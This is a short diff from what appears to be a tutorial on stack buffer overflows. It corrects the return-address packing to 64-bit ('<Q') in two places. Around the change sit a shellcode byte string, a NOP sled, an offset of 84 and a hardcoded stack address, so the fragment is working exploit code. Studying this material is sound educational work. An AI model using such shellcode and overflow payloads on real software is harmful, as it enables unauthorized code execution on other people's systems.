@@ -270,7 +270,7 @@ shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x5
 buf_size = 64
 offset = ??
 
-ret_addr = struct.pack('<I', 0x??)
+ret_addr = struct.pack('<Q', 0x??)
 
 # fill up to 64 bytes
 exploit = "\x90" * (buf_size - len(shellcode))
@@ -300,7 +300,7 @@ buf_size = 64
 offset = 84
 
 # 0x7fffffffe87b
-ret_addr = struct.pack('<I', 0x7fffffffe87b)
+ret_addr = struct.pack('<Q', 0x7fffffffe87b)
 
 # fill up to 64 bytes
 exploit = "\x90" * (buf_size - len(shellcode))
